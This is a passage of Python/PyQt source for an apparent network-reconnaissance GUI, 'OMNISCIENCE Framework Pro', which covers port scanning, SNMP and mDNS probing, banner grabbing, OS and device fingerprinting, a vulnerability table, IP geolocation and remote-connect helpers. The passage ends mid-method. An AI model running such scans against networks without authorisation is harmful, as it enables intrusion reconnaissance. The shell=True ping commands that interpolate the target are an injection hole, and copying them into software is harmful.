            # mDNS query for _services._dns-sd._udp
            mdns_query = b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00_services._dns-sd._udp.local\x00\x00\x0c\x00\x01'
            sock.sendto(mdns_query, ('224.0.0.251', 5353))
            sock.close()
            return True
        except:
            pass
        return False
    
    def snmp_scan(self, ip):
        """Scan SNMP for device information"""
        try:
            import socket
            # Try SNMP community string
            snmp_packet = b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x00\x00\x00\x00'
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(snmp_packet, (ip, 161))
            data, addr = sock.recvfrom(1024)
            sock.close()
            if data:
                return "SNMP Device"
        except:
            pass
        return None
    
    def ssdp_scan(self, ip):
        """Scan SSDP/UPnP for devices"""
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 1900))
            sock.close()
            if result == 0:
                return True
        except:
            pass
        return False
    
    def scan_all_protocols(self, ip):
        """Scan using all discovery protocols"""
        info = {"ip": ip, "hostname": "", "mac": "", "vendor": "", "device_type": "", "os": "Unknown", "status": "offline", "ports": [], "services": {}, "vulnerabilities": [], "discovery_methods": []}
        
        # 1. Check if online via ping
        try:
            import subprocess
            result = subprocess.run(f"ping -n 1 -w 500 {ip}", shell=True, capture_output=True)
            if result.returncode == 0:
                info["status"] = "online"
                info["discovery_methods"].append("ICMP")
        except:
            pass
        
        if info["status"] != "online":
            return None
        
        # 2. Try to get MAC from ARP
        mac = self.get_mac_address(ip)
        if mac:
            info["mac"] = mac
            info["vendor"] = self.get_mac_vendor(mac)
            info["discovery_methods"].append("ARP")
        
        # 3. Try hostname resolution
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            if hostname:
                info["hostname"] = hostname
                info["discovery_methods"].append("DNS")
        except:
            pass
        
        # 4. Try NetBIOS (Windows)
        nb_name = self.netbios_scan(ip)
        if nb_name:
            info["hostname"] = info.get("hostname", "") or nb_name
            info["discovery_methods"].append("NetBIOS")
            info["device_type"] = "Windows PC"
        
        # 5. Check common ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                    info["discovery_methods"].append(f"Port {port}")
                sock.close()
            except:
                pass
        
        info["ports"] = open_ports
        
        # 6. Detect OS from ports
        if 3389 in open_ports:
            info["os"] = "Windows (RDP)"
        elif 445 in open_ports and 139 in open_ports:
            info["os"] = "Windows"
        elif 22 in open_ports:
            info["os"] = "Linux/Unix"
        elif 80 in open_ports or 443 in open_ports:
            info["os"] = "Web Server"
        
        # 7. Detect device type
        info["device_type"] = self.detect_device_type(ip, open_ports, info.get("vendor", ""), mac)
        
        return info
    
    # OUI Database for MAC vendor lookup (partial - most common vendors)
    OUI_VENDORS = {
        "00:50:56": "VMware", "00:0C:29": "VMware", "00:1C:42": "Parallels",
        "00:03:FF": "Microsoft", "00:15:5D": "Microsoft Hyper-V",
        "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
        "00:1A:2B": "Alcatel", "00:1E:68": "Quanta", "B8:27:EB": "Raspberry Pi",
        "DC:A6:32": "Raspberry Pi", "E4:5F:01": "Raspberry Pi",
        "00:0D:56": "Dell", "00:1E:C9": "Dell", "18:03:73": "Dell",
        "00:1C:23": "Hewlett-Packard", "00:21:5A": "Hewlett-Packard",
        "3C:D9:2B": "Hewlett-Packard", "00:17:42": "Cisco", "00:1B:2B": "Cisco",
        "00:26:AB": "D-Link", "1C:7E:E5": "D-Link", "00:1F:F3": "Apple",
        "F0:18:98": "Apple", "3C:06:30": "Apple", "A4:83:E7": "Apple",
        "00:1F:C6": "Apple", "00:25:00": "Apple", "00:26:BB": "Apple",
        "00:1D:4F": "Apple", "00:23:32": "Apple", "00:23:6C": "Apple",
        "00:24:36": "Apple", "28:6A:BA": "Apple", "28:CF:DA": "Apple",
        "20:C9:D0": "Apple", "A4:B1:97": "Apple", "F0:B4:29": "Apple",
        "00:26:08": "Apple", "00:23:12": "Apple", "00:23:DF": "Apple",
        "34:08:BC": "Intel", "3C:A9:F4": "Intel", "00:1E:67": "Intel",
        "00:15:17": "Intel", "00:16:6F": "Intel", "00:16:EA": "Intel",
        "00:16:EB": "Intel", "00:17:35": "Intel", "00:18:DE": "Intel",
        "00:19:D1": "Intel", "00:19:D2": "Intel", "00:1B:21": "Intel",
        "00:1B:77": "Intel", "00:1C:C0": "Intel", "00:1D:E0": "Intel",
        "00:1E:64": "Intel", "00:1E:65": "Intel", "00:21:5C": "Intel",
        "00:21:6A": "Intel", "00:21:6B": "Intel", "00:22:FA": "Intel",
        "00:22:FB": "Intel", "00:23:14": "Intel", "00:23:15": "Intel",
        "00:23:16": "Intel", "00:24:D6": "Intel", "00:24:D7": "Intel",
        "00:26:C6": "Intel", "00:26:C7": "Intel", "00:26:ED": "Intel",
        "00:27:10": "Intel", "3C:A9:F4": "Intel", "40:A6:B7": "Intel",
        "00:1E:67": "Intel", "00:15:00": "Intel", "00:15:01": "Intel",
        "34:08:04": "Intel", "3C:97:0E": "Wistron", "00:24:14": "Liteon",
        "00:23:54": "ASUSTek", "00:26:18": "ASUSTek", "10:BF:48": "ASUSTek",
        "14:DA:E9": "ASUSTek", "14:DD:A9": "ASUSTek", "1C:87:2C": "ASUSTek",
        "1C:B7:2C": "ASUSTek", "20:CF:30": "ASUSTek", "30:5A:3A": "ASUSTek",
        "30:85:A9": "ASUSTek", "38:D5:47": "ASUSTek", "40:16:7E": "ASUSTek",
        "50:46:5D": "ASUSTek", "54:04:A6": "ASUSTek", "54:A0:50": "ASUSTek",
        "60:A4:4C": "ASUSTek", "60:CF:84": "ASUSTek", "88:D7:F6": "ASUSTek",
        "AC:9E:17": "ASUSTek", "B0:6E:BF": "ASUSTek", "BC:AE:C5": "ASUSTek",
        "BC:EE:7B": "ASUSTek", "C8:60:00": "ASUSTek", "E0:3F:49": "ASUSTek",
        "E0:CB:4E": "ASUSTek", "F0:79:59": "ASUSTek", "F4:6D:04": "ASUSTek",
        "F8:32:E4": "ASUSTek", "00:1D:60": "ASUSTek", "00:22:15": "ASUSTek",
        "00:23:54": "ASUSTek", "00:24:8C": "ASUSTek", "00:24:8D": "ASUSTek",
        "00:26:18": "ASUSTek", "00:26:19": "ASUSTek", "00:27:0B": "ASUSTek",
        "00:27:0C": "ASUSTek", "00:27:0D": "ASUSTek", "00:27:0E": "ASUSTek",
        "00:27:0F": "ASUSTek", "00:27:10": "ASUSTek", "00:27:11": "ASUSTek",
        "00:27:12": "ASUSTek", "AC:22:0B": "ASUSTek", "AC:9E:17": "ASUSTek",
        "B0:6E:BF": "ASUSTek", "B8:88:E3": "ASUSTek", "BC:AE:C5": "ASUSTek",
        "BC:EE:7B": "ASUSTek", "C8:60:00": "ASUSTek", "D8:50:E6": "ASUSTek",
        "00:16:F2": "Linksys", "00:18:39": "Linksys", "00:18:F8": "Linksys",
        "00:1A:70": "Linksys", "00:1C:10": "Linksys", "00:1D:7E": "Linksys",
        "00:1E:E5": "Linksys", "00:21:29": "Linksys", "00:22:6B": "Linksys",
        "00:23:69": "Linksys", "00:25:9C": "Linksys", "00:26:F2": "Linksys",
        "10:0C:6B": "Linksys", "14:91:82": "Linksys", "20:AA:4B": "Linksys",
        "24:F5:AA": "Linksys", "28:C6:8E": "Linksys", "30:46:9A": "Linksys",
        "34:08:04": "Linksys", "40:0E:85": "Linksys", "44:D3:AD": "Linksys",
        "48:F8:B3": "Linksys", "50:67:AE": "Linksys", "58:6D:8F": "Linksys",
        "5C:3C:16": "Linksys", "68:7F:74": "Linksys", "68:A8:6D": "Linksys",
        "6C:B7:E4": "Linksys", "70:4F:57": "Linksys", "78:54:2E": "Linksys",
        "7C:6D:62": "Linksys", "84:16:F9": "Linksys", "88:C9:D0": "Linksys",
        "8C:49:62": "Linksys", "90:94:E4": "Linksys", "94:0C:6D": "Linksys",
        "98:DA:C4": "Linksys", "9C:5C:8E": "Linksys", "A0:21:B7": "Linksys",
        "A4:2B:8C": "Linksys", "A4:B1:97": "Linksys", "A8:40:A0": "Linksys",
        "AC:22:0B": "ASUSTek", "C8:3A:6B": "Tenda", "00:00:00": "Generic"
    }
    
    def __init__(self, targets, ports=None, parent=None):
        super().__init__(parent)
        self.targets = targets
        # Comprehensive port list (1000+ ports in tiers)
        # Tier 1: Critical ports (fast scan)
        self.tier1_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        # Tier 2: Common ports (medium scan)
        self.tier2_ports = [20, 24, 26, 110, 111, 135, 137, 138, 161, 162, 389, 427, 443, 445, 465, 514, 515, 587, 636, 993, 995, 1433, 1521, 1723, 1755, 1900, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 5432, 5500, 5900, 5985, 5986, 6379, 8000, 8008, 8009, 8080, 8081, 8443, 8888, 9090, 9200, 9300, 10000, 27017]
        # Tier 3: Additional well-known ports
        self.tier3_ports = list(range(1, 1024))  # All ports 1-1024
        
        # Default scan ports (comprehensive - 1000+ ports)
        self.ports = ports or list(range(1, 1001)) + [1433, 1521, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8000, 8080, 8081, 8443, 8888, 9090, 9200, 9300, 10000, 27017, 27018, 27019, 28017]
        self.arp_cache = {}
        self._build_arp_cache()
        
    def _build_arp_cache(self):
        """Build ARP cache for MAC address lookup"""
        try:
            import subprocess
            result = subprocess.run("arp -a", shell=True, capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0]
                    mac = parts[1] if '-' in parts[1] or ':' in parts[1] else None
                    if mac and len(mac) == 17:
                        # Normalize MAC format
                        mac = mac.replace('-', ':').upper()
                        self.arp_cache[ip] = mac
        except:
            pass
    
    def get_mac_vendor(self, mac):
        """Look up MAC vendor from OUI database"""
        if not mac:
            return "Unknown"
        # Get first 8 characters (OUI prefix)
        oui = mac.replace(':', '-')[:8].upper()
        # Try exact match first
        if oui in self.OUI_VENDORS:
            return self.OUI_VENDORS[oui]
        # Try partial match (first 6 characters)
        oui_short = oui[:8]
        for key in self.OUI_VENDORS:
            if key.startswith(oui_short[:8]):
                return self.OUI_VENDORS[key]
        return "Unknown"
    
    def get_mac_address(self, ip):
        """Get MAC address for an IP from ARP cache"""
        return self.arp_cache.get(ip, "")
    
    def grab_banner(self, ip, port):
        """Grab banner from open ports for OS/service detection"""
        banner = ""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            sock.connect((ip, port))
            
            # Send protocol-specific requests for better banner grabbing
            if port == 80 or port == 8080 or port == 8443:
                # HTTP request
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n")
            elif port == 21:
                # FTP - just wait for banner
                pass
            elif port == 22:
                # SSH - wait for banner
                pass
            elif port == 23:
                # Telnet - wait for prompt
                sock.send(b"\r\n")
            elif port == 25 or port == 587:
                # SMTP - just wait for banner
                pass
            elif port == 110:
                # POP3 - just wait for banner
                pass
            elif port == 143:
                # IMAP - just wait for banner
                pass
            elif port == 445:
                # SMB - try to get version info
                pass
            elif port == 3306:
                # MySQL - just wait for banner
                pass
            elif port == 5432:
                # PostgreSQL - just wait for banner
                pass
            elif port == 27017:
                # MongoDB - just wait for banner
                pass
            elif port == 6379:
                # Redis - just wait for banner
                pass
            
            # Receive response
            banner = sock.recv(2048).decode('utf-8', errors='ignore')
            sock.close()
        except:
            pass
        return banner
    
    def detect_service_versions(self, ip, open_ports):
        """Detect detailed service versions from banners"""
        services = {}
        
        for port in open_ports:
            banner = self.grab_banner(ip, port)
            if banner:
                service_info = self.analyze_banner(port, banner)
                if service_info:
                    services[port] = service_info
        
        return services
    
    def analyze_banner(self, port, banner):
        """Analyze banner to extract service version information"""
        if not banner:
            return None
            
        banner_lower = banner.lower()
        
        # HTTP/Web Server detection
        if port in [80, 8080, 8443, 443]:
            if 'apache' in banner_lower:
                # Extract version if available
                import re
                match = re.search(r'apache[\/](\d+\.\d+\.\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"Apache HTTPD {version}"
            elif 'nginx' in banner_lower:
                import re
                match = re.search(r'nginx[\/](\d+\.\d+\.\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"Nginx {version}"
            elif 'microsoft-iis' in banner_lower or 'iis' in banner_lower:
                import re
                match = re.search(r'iis[\/](\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"Microsoft IIS {version}"
            elif 'lighttpd' in banner_lower:
                return "Lighttpd"
            elif 'nodejs' in banner_lower or 'express' in banner_lower:
                return "Node.js/Express"
            return "Web Server"
        
        # SSH detection
        if port == 22:
            if 'openssh' in banner_lower:
                import re
                match = re.search(r'openssh[_-](\d+\.\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"OpenSSH {version}"
            elif 'dropbear' in banner_lower:
                return "Dropbear SSH"
            return "SSH Server"
        
        # FTP detection
        if port == 21:
            if 'vsftpd' in banner_lower:
                import re
                match = re.search(r'vsftpd[\s]+(\d+\.\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"vsftpd {version}"
            elif 'proftpd' in banner_lower:
                return "ProFTPD"
            elif 'filezilla' in banner_lower:
                return "FileZilla Server"
            return "FTP Server"
        
        # SMTP detection
        if port in [25, 587]:
            if 'postfix' in banner_lower:
                return "Postfix"
            elif 'exim' in banner_lower:
                return "Exim"
            elif 'sendmail' in banner_lower:
                return "Sendmail"
            elif 'microsoft' in banner_lower:
                return "Microsoft Exchange"
            return "SMTP Server"
        
        # MySQL detection
        if port == 3306:
            if 'mariadb' in banner_lower:
                import re
                match = re.search(r'mariadb[\s]+(\d+\.\d+)', banner_lower)
                version = match.group(1) if match else "Unknown"
                return f"MariaDB {version}"
            return "MySQL"
        
        # PostgreSQL detection
        if port == 5432:
            return "PostgreSQL"
        
        # RDP detection
        if port == 3389:
            return "Microsoft RDP (Terminal Services)"
        
        # SMB detection
        if port in [445, 139]:
            if 'samba' in banner_lower:
                return "Samba"
            return "Windows SMB"
        
        # VNC detection
        if port == 5900:
            if 'vnc' in banner_lower:
                return "VNC Server"
            return "VNC"
        
        # MongoDB
        if port == 27017:
            return "MongoDB"
        
        # Redis
        if port == 6379:
            return "Redis"
        
        return None
    
    def assess_vulnerabilities(self, open_ports, services):
        """Assess potential vulnerabilities based on open ports and services"""
        vulnerabilities = []
        
        # High-risk services
        high_risk = {
            21: "FTP - Unencrypted file transfer, susceptible to eavesdropping",
            23: "Telnet - Unencrypted remote access, highly insecure",
            135: "Windows RPC - Can be exploited for remote code execution",
            139: "NetBIOS - Information disclosure and potential exploit",
            445: "SMB - Multiple critical vulnerabilities (EternalBlue, etc.)",
            1433: "MSSQL - Database exposed, potential for SQL injection",
            3306: "MySQL - Database exposed, ensure proper authentication",
            3389: "RDP - Target for brute force and exploits (BlueKeep)",
            5432: "PostgreSQL - Database exposed, ensure proper authentication",
            5900: "VNC - Unencrypted remote access",
            6379: "Redis - No authentication by default, data exposure risk",
            27017: "MongoDB - No authentication by default, data exposure risk",
        }
        
        # Medium-risk services
        medium_risk = {
            22: "SSH - Ensure strong authentication and key-based login",
            25: "SMTP - Potential for spam relay",
            53: "DNS - Potential for DNS poisoning",
            80: "HTTP - Unencrypted web traffic, vulnerable to MITM",
            110: "POP3 - Unencrypted email retrieval",
            143: "IMAP - Unencrypted email access",
            443: "HTTPS - Ensure valid certificates and strong ciphers",
            587: "SMTP submission - Ensure TLS is required",
            8080: "HTTP Proxy - Ensure proper authentication",
            8443: "HTTPS Alt - Ensure valid certificates",
        }
        
        # Check high-risk vulnerabilities
        for port in open_ports:
            if port in high_risk:
                vulnerabilities.append({"port": port, "risk": "HIGH", "issue": high_risk[port]})
            elif port in medium_risk:
                vulnerabilities.append({"port": port, "risk": "MEDIUM", "issue": medium_risk[port]})
        
        # Check for specific service vulnerabilities based on banners
        for port, service in services.items():
            if service:
                service_lower = service.lower()
                # Check for outdated/vulnerable versions
                if 'apache' in service_lower and '2.2' in service_lower:
                    vulnerabilities.append({"port": port, "risk": "HIGH", "issue": "Apache 2.2.x has known vulnerabilities, upgrade recommended"})
                elif 'openssh' in service_lower and '7.' in service_lower and '7.9' not in service_lower:
                    vulnerabilities.append({"port": port, "risk": "MEDIUM", "issue": "OpenSSH < 7.9 may have vulnerabilities"})
                elif 'vsftpd' in service_lower and '2.3' in service_lower:
                    vulnerabilities.append({"port": port, "risk": "HIGH", "issue": "vsftpd 2.3.x backdoor vulnerability"})
        
        return vulnerabilities
    
    def get_device_location(self, ip):
        """Get geographic location for an IP address"""
        location = {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown", "lat": 0, "lon": 0}
        
        # Skip private/local IPs
        if ip.startswith(('10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', '192.168.', '127.')):
            location["city"] = "Local Network"
            location["country"] = "Private"
            return location
        
        try:
            # Try to use IPinfo API (free tier)
            import urllib.request
            url = f"https://ipinfo.io/{ip}/json"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                data = json.loads(response.read().decode())
                if 'city' in data:
                    location['city'] = data.get('city', 'Unknown')
                if 'region' in data:
                    location['region'] = data.get('region', 'Unknown')
                if 'country' in data:
                    location['country'] = data.get('country', 'Unknown')
                if 'org' in data:
                    location['isp'] = data.get('org', 'Unknown')
                if 'loc' in data:
                    coords = data.get('loc', '').split(',')
                    if len(coords) == 2:
                        location['lat'] = float(coords[0])
                        location['lon'] = float(coords[1])
        except:
            # Fallback: determine location from IP range
            pass
        
        return location
    
    def detect_device_type(self, ip, open_ports, vendor, mac):
        """Detect device type based on ports, vendor, and other factors"""
        device_type = "Unknown"
        
        # Check vendor for known device types
        if vendor:
            if 'Apple' in vendor:
                device_type = "Apple Device"
            elif 'Samsung' in vendor:
                device_type = "Samsung Device"
            elif 'Intel' in vendor:
                device_type = "Intel Device/Server"
            elif 'Dell' in vendor:
                device_type = "Dell Server/Workstation"
            elif 'HP' in vendor or 'Hewlett-Packard' in vendor:
                device_type = "HP Server/Workstation"
            elif 'Cisco' in vendor:
                device_type = "Cisco Network Device"
            elif 'Linksys' in vendor or 'Netgear' in vendor or 'D-Link' in vendor:
                device_type = "Network Router/Access Point"
            elif 'Raspberry' in vendor:
                device_type = "Raspberry Pi"
            elif 'VMware' in vendor or 'VirtualBox' in vendor or 'QEMU' in vendor:
                device_type = "Virtual Machine"
            elif 'Microsoft' in vendor:
                device_type = "Microsoft Device"
        
        # Check ports for device type
        if 80 in open_ports or 443 in open_ports or 8080 in open_ports:
            if device_type == "Unknown":
                device_type = "Web Server/Device"
        if 554 in open_ports or 8554 in open_ports:
            device_type = "IP Camera/Video Device"
        if 8086 in open_ports or 27018 in open_ports:
            device_type = "IoT Device/Database"
        if 1883 in open_ports or 8883 in open_ports:
            device_type = "IoT Device (MQTT)"
        if 5353 in open_ports:
            device_type = "Apple Device (AirPlay)"
        if 548 in open_ports:
            device_type = "Apple Device (AFP)"
        if 1900 in open_ports:
            device_type = "Smart TV/Media Device"
        if 9000 in open_ports:
            device_type = "Sonoff Smart Home"
        if 8123 in open_ports:
            device_type = "Home Assistant"
        
        # Check for printer ports
        if 631 in open_ports or 9100 in open_ports:
            device_type = "Network Printer"
        
        # Check for NAS ports
        if 5000 in open_ports or 5001 in open_ports:
            device_type = "Synology NAS"
        if 21194 in open_ports:
            device_type = "FreeNAS/TrueNAS"
        
        return device_type
    
    def connect_ssh(self, ip, username, password, port=22):
        """Attempt SSH connection"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=10)
            return {"success": True, "message": "SSH Connected"}
        except ImportError:
            return {"success": False, "message": "paramiko not installed"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def connect_rdp(self, ip, username, password):
        """Attempt RDP connection"""
        try:
            import subprocess
            # Use Windows mstsc for RDP
            result = subprocess.run(f'mstsc /v:{ip}', shell=True, capture_output=True)
            return {"success": True, "message": "RDP initiated"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def connect_vnc(self, ip, port=5900):
        """Attempt VNC connection"""
        try:
            import subprocess
            # Try to launch VNC viewer
            result = subprocess.run(f'vncviewer {ip}:{port}', shell=True, capture_output=True)
            return {"success": True, "message": "VNC connection initiated"}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def connect_telnet(self, ip, port=23):
        """Connect via Telnet"""
        try:
            import telnetlib
            tn = telnetlib.Telnet(ip, port, timeout=5)
            return {"success": True, "message": "Telnet Connected", "connection": tn}
        except Exception as e:
            return {"success": False, "message": str(e)}
    
    def detect_os_advanced(self, ip, open_ports):
        """Advanced OS detection using port signatures, banner grabbing, and heuristics"""
        os_guesses = []
        
        # Grab banners from common ports
        banners = {}
        for port in [80, 22, 445, 139, 21, 23, 3389, 8080, 8443]:
            if port in open_ports:
                banners[port] = self.grab_banner(ip, port)
        
        # Analyze banners for OS signatures
        for port, banner in banners.items():
            if banner:
                banner_lower = banner.lower()
                if 'server' in banner_lower or 'microsoft' in banner_lower or 'iis' in banner_lower:
                    os_guesses.append("Windows Server")
                if 'ubuntu' in banner_lower or 'debian' in banner_lower or 'centos' in banner_lower:
                    os_guesses.append("Linux")
                if 'openssh' in banner_lower:
                    os_guesses.append("Linux/Unix")
                if 'apache' in banner_lower or 'nginx' in banner_lower:
                    os_guesses.append("Linux")
                if 'ssh' in banner_lower and 'openssh' not in banner_lower:
                    os_guesses.append("Linux/Unix")
                    
        # Port-based OS detection (more comprehensive)
        if 3389 in open_ports:
            os_guesses.append("Windows (RDP)")
        if 445 in open_ports and 139 in open_ports:
            os_guesses.append("Windows")
        if 445 in open_ports:
            os_guesses.append("Windows (SMB)")
        if 139 in open_ports:
            os_guesses.append("Windows (NetBIOS)")
        if 22 in open_ports:
            os_guesses.append("Linux/Unix (SSH)")
        if 80 in open_ports or 443 in open_ports or 8080 in open_ports or 8443 in open_ports:
            if not any('windows' in o.lower() for o in os_guesses):
                os_guesses.append("Linux/Unix (Web Server)")
        if 21 in open_ports:
            os_guesses.append("Linux/Unix (FTP)")
        if 23 in open_ports:
            os_guesses.append("Linux/Unix (Telnet)")
        if 3306 in open_ports:
            os_guesses.append("Linux (MySQL)")
        if 5432 in open_ports:
            os_guesses.append("Linux (PostgreSQL)")
        if 27017 in open_ports:
            os_guesses.append("Linux (MongoDB)")
        if 5900 in open_ports:
            os_guesses.append("Linux/Unix (VNC)")
            
        # If no ports but ping works, try to guess based on response time and common subnets
        if not open_ports:
            # Most IoT devices, phones, etc. don't have traditional ports open
            # Check if we have a MAC address to help identify
            mac = self.get_mac_address(ip)
            if mac:
                vendor = self.get_mac_vendor(mac)
                if vendor in ["Apple", "Samsung", "Google", "Microsoft", "Intel", "Dell", "HP", "ASUSTek"]:
                    os_guesses.append(f"{vendor} Device")
                elif "Raspberry" in vendor:
                    os_guesses.append("Raspberry Pi (Linux)")
                elif "VMware" in vendor or "VirtualBox" in vendor or "QEMU" in vendor:
                    os_guesses.append("Virtual Machine")
            else:
                # No MAC and no ports - likely IoT or mobile device
                os_guesses.append("Mobile/IoT Device")
                
        # Return most confident guess
        if not os_guesses:
            return "Unknown"
        
        # Prioritize Windows detection
        for guess in os_guesses:
            if 'windows' in guess.lower():
                return guess
        
        return os_guesses[0] if os_guesses else "Unknown"
    
    def run(self):
        try:
            import subprocess
            total = len(self.targets)
            for i, target in enumerate(self.targets):
                self.progress.emit(int((i/total)*100), f"Scanning {target}...")
                
                # Ping check
                ping = subprocess.run(
                    f"ping -n 1 -w 500 {target}",
                    shell=True,
                    capture_output=True
                )
                
                status = "online" if ping.returncode == 0 else "offline"
                
                # Port scan
                open_ports = []
                for port in self.ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((target, port))
                        if result == 0:
                            open_ports.append(port)
                            # Emit connection found
                            self.connection_found.emit(target, self.get_protocol(port), str(port))
                        sock.close()
                    except:
                        pass
                
                hostname = ""
                mac = ""
                vendor = ""
                try:
                    hostname = socket.gethostbyaddr(target)[0]
                except:
                    pass
                
                # Try to get MAC via ARP for online hosts
                if status == "online":
                    # Refresh ARP cache periodically
                    if i % 10 == 0:
                        self._build_arp_cache()
                    
                    # Try direct ARP lookup
                    try:
                        arp_result = subprocess.run(f"arp -a {target}", shell=True, capture_output=True, text=True, timeout=2)
                        for line in arp_result.stdout.split('\n'):
                            if target in line:
                                parts = line.split()
                                for part in parts:
                                    if '-' in part or ':' in part:
                                        if len(part) == 17 or (len(part) == 14 and '-' in part):
                                            mac = part.replace('-', ':').upper()
                                            break
                    except:
                        pass
                    
                # Get MAC from ARP cache if not found directly
                if not mac:
                    mac = self.get_mac_address(target)
                
                if mac:
                    vendor = self.get_mac_vendor(mac)
                
                # Get advanced OS detection
                os_guess = self.detect_os_advanced(target, open_ports)
                
                # Get service versions (only for online hosts with open ports)
                services = {}
                vulnerabilities = []
                device_type = "Unknown"
                location = {"city": "", "region": "", "country": "", "isp": "", "lat": 0, "lon": 0}
                
                if status == "online" and open_ports:
                    services = self.detect_service_versions(target, open_ports)
                    vulnerabilities = self.assess_vulnerabilities(open_ports, services)
                    
                    # Detect device type
                    device_type = self.detect_device_type(target, open_ports, vendor, mac)
                    
                    # Get location (only for non-local IPs)
                    if not target.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.2', '127.')):
                        location = self.get_device_location(target)
                
                host_info = {
                    "ip": target,
                    "hostname": hostname,
                    "mac": mac,
                    "vendor": vendor,
                    "device_type": device_type,
                    "location": location,
                    "status": status,
                    "ports": open_ports,
                    "os": os_guess,
                    "services": services,
                    "vulnerabilities": vulnerabilities
                }
                self.host_found.emit(host_info)
                
            self.finished.emit()
        except Exception as e:
            self.finished.emit()
    
    def get_protocol(self, port):
        protocols = {
            80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP",
            23: "TELNET", 25: "SMTP", 110: "POP3", 143: "IMAP",
            445: "SMB", 3389: "RDP", 3306: "MySQL", 5432: "PostgreSQL",
            27017: "MongoDB", 5900: "VNC", 6379: "Redis"
        }
        return protocols.get(port, "TCP")
    
    def guess_os(self, ports):
        if 445 in ports or 3389 in ports:
            return "Windows"
        elif 22 in ports:
            return "Linux/Unix"
        return "Unknown"

class MessageServer(QThread):
    """Background thread for PC-to-PC messaging"""
    message_received = pyqtSignal(str, str, str)  # from, to, message
    
    def __init__(self, port=9999, parent=None):
        super().__init__(parent)
        self.port = port
        self.running = True
        self.socket = None
        
    def run(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.settimeout(1.0)
            
            while self.running:
                try:
                    data, addr = self.socket.recvfrom(4096)
                    msg = json.loads(data.decode())
                    self.message_received.emit(msg.get('from', ''), msg.get('to', ''), msg.get('message', ''))
                except socket.timeout:
                    continue
                except:
                    pass
        except Exception as e:
            pass
        finally:
            if self.socket:
                self.socket.close()
    
    def stop(self):
        self.running = False

# ==================== MAIN GUI APPLICATION ====================

class OmniscienceProGUI(QMainWindow):
    """Main application window with real CLI integration"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("◈ OMNISCIENCE Framework Pro ◈")
        self.setGeometry(100, 100, 1500, 950)
        
        # Core data
        self.hosts = []
        self.network_scene = NetworkGraphicsScene()
        self.command_history = []
        self.history_index = -1
        self.cli = CLIManager(self.log_activity)
        
        # Message server
        self.msg_server = MessageServer()
        self.msg_server.message_received.connect(self.on_message_received)
        self.msg_server.start()
        
        # Real-time network monitoring
        self.net_monitor_timer = QTimer()
        self.net_monitor_timer.timeout.connect(self.update_network_monitor)
        self.net_monitor_timer.start(5000)  # Update every 5 seconds
        
        self.setup_ui()
        self.apply_dark_theme()
        self.load_system_info()
        
        # Real-time session refresh (every 3 seconds)
        self.session_timer = QTimer()
        self.session_timer.timeout.connect(self.refresh_sessions)
        self.session_timer.start(3000)
        
    def setup_ui(self):
        """Setup the user interface"""
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        main_layout = QHBoxLayout(central_widget)
        
        # Left panel - Navigation and quick actions
        left_panel = self.create_left_panel()
        main_layout.addWidget(left_panel, 1)
        
        # Right panel - Main content
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.TabPosition.West)
        
        # Dashboard Tab
        self.tabs.addTab(self.create_dashboard_tab(), "📊 Dashboard")
        
        # Network Tab (Real Network Visualization)
        self.tabs.addTab(self.create_network_tab(), "🌐 Network")
        
        # Real CLI Tab
        self.tabs.addTab(self.create_cli_tab(), "⚡ Real CLI")
        
        # Sessions Tab
